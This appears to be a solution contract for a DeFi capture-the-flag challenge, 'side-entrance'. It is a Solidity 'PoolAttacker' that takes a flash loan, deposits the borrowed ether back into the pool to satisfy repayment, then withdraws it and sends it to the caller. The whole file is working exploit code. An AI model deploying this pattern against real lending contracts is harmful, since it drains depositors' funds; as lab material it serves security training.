// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

// import "contracts/side-entrance/SideEntranceLenderPool.sol";
import "hardhat/console.sol";

interface ISideEntranceLenderPool {
    function deposit() external payable;
    function flashLoan(uint256 amount) external;
    function withdraw() external;
}

contract PoolAttacker {

    address payable private pool;
    address private owner;
    uint256 amount;

    constructor (address _pool){
        owner =msg.sender;
        pool = payable(_pool);
    }

    function attack(uint256 _amount) external {
        amount = _amount;
        ISideEntranceLenderPool(pool).flashLoan(amount);
    }

    function execute() external payable {
        (bool success, ) = pool.call{value:amount}(abi.encodeWithSignature("deposit()"));
        require(success);
    }

    function steal() external payable {
        ISideEntranceLenderPool(pool).withdraw();
        (bool success, ) = payable(msg.sender).call{value:amount}("");
        require(success);
    }

    receive() external payable {}

}